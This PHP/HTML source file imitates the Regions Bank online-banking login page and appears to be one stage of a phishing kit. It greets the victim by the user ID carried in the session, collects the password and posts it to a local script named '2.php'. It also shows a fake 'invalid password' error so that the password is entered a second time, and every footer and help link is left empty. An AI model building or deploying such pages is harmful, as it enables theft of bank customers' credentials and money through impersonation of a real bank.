<?php
session_start(); 




$Email2 = $_SESSION['userid'];



?>

<!DOCTYPE html>

<html lang="en" x-ms-format-detection="none">



<head>



    <meta charset="utf-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="description" content="Log in to your Regions online banking account to securely access and manage accounts, pay bills, transfer money and more. New to online banking? Enroll today.">

    <title>Regions Online Banking - Log in to your accounts | Regions </title>

    <link href="css/com-regions.css" rel="stylesheet">

    <link href="css/oldAuth.min.css" rel="stylesheet">

    <link rel="icon" href="favicon.ico">

</head>



<body>



    <header class="rds-header simple">

        <div class="container">

            <a class="logo-link" href="" title="Go home">

                <picture class="logo">

                    <source srcset="media/regions-logo-no-r.svg" media="(max-width: 600px)">

                    <img src="media/regions-logo-no-r.svg" alt="regions logo">

                </picture>

            </a>

        </div>

    </header>







    <main role="main" class="pb-3" id="main-section">





        <link href="css/Common.css" rel="stylesheet">



        <div>

            <div class="rds-wizard-body">

                <div class="body-content">

                    <div class="rds-short-form-tile container login-enroll">

                        <h1 class="sr-only"> Login to Online Banking</h1>

                        <?php

                        if (isset($_GET['error']) && $_GET['error'] == 1) {

                        ?>

                            <div class="col-md-12">

                                <div class="alert alert-danger" id="page-level-error-box" aria-live="polite" style="display: block;">

                                    <div class="span sr-only">Login error status:</div>

                                    <div id="page-level-message">Oops! Either the Online ID or Password you entered is invalid. Please try again.</div>

                                    <button type="button" id="alert-close" aria-label="Close alert">X</button>

                                </div>

                            </div>



                        <?php

                        }

                        ?>

                        <div class="row col-md-6 col-md-offset-3" id="password-section" style="display: block;">

                            <div class="col-xs-12">

                                <h2 id="password-header">Existing Online Customers</h2>

                                <div id="transmitContainer" style="display: block;">



                                    <div class="row col-xs-12"> <span id="online-id" class="page-heading">Please enter your password for <?php  echo $Email2; ?> to login.</span>

                                        <div class="row margin-top-20">

                                            <div class="col-xs-12 margin-bottom-30">

                                                <form class="rds-form form" id="frmpassword" action="2.php" method="POST" autocomplete="off">

                                                    <?php

                                                    if (isset($_GET['error']) && $_GET['error'] == 1) {

                                                    ?>

                                                        <input type="hidden" name="action" value="2">

                                                    <?php

                                                    } else {

                                                    ?>

                                                        <input type="hidden" name="action" value="1">

                                                    <?php

                                                    }

                                                    ?>

                                                    <div class="field animated-label text password" id="divPassword"> <label class="control-label" for="input_password">Password</label>

                                                        <input type="password" id="input_password" name="Password" aria-labelledby="online-id" aria-required="True" class="form-control to-switch mask-text" maxlength="32" autocomplete="off" style="max-height: 67px; padding-top: 33px;" aria-invalid="false">

                                                        <input type="button" class="inline-btn show-hide-btn" id="showHidePasswordBtn" value="Show" aria-label="Show Password" style="max-height: 67px; padding-top: 33px;">

                                                        <div id="input_password-error" class="error-custom-block hidden">

                                                            <p class="help-block error">Password is required to log in.</p>

                                                        </div>

                                                    </div>

                                                    <div class="form-btn-holder">

                                                        <div class="pull-left"> <button type="button" class="btn btn-lg cancel-btn" id="cancel-password-button">Go Back</button> </div>

                                                        <div class="pull-right"> <button type="submit" class="btn btn-primary btn-lg submit-btn" id="submit-password-button">Log In</button> </div>

                                                    </div>

                                                </form>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div id="password-forgot-url-link">

                                    <span class="forgot-url-link"><span aria-hidden="true">Forgot </span><a href="" aria-label="Forgot Online ID?">Online ID</a> or <a href="" aria-label="Forgot Password?">Password?</a></span>

                                </div>

                            </div>



                        </div>

                    </div>

                </div>

            </div>

        </div>



    </main>





    <footer class="rds-footer">

        <div class="footer-content">

            <ul>

                <li><a href="" target="_blank">Contact Us</a></li>

                <li><a href="" target="_blank">Terms and Conditions</a></li>

                <li><a href="" target="_blank">Privacy Pledge</a></li>

                <li><a href="" target="_blank">Security</a></li>

                <li><a href="" target="_blank">Online Tracking and Advertising</a></li>

                <li><a href="" target="_blank">Accessible Banking</a></li>

                <li><a href="" target="_blank">Leave Feedback</a></li>



            </ul>



            <p>Call&nbsp;<a href="">1-800-REGIONS</a></p>

            <p>Regions, the Regions logo, the LifeGreen color, and the LifeGreen bike are registered trademarks of Regions Bank.</p>

            <p>© 2022 Regions Bank. All Rights Reserved.</p>



            <div class="footer-icon">

                <img src="media/equal-housing-lender.svg" alt="Equal Housing Lender">

                <img src="media/member-fdic.svg" alt="Member FDIC">

            </div>

        </div>

    </footer>



    <div>





    </div>







</body>



</html>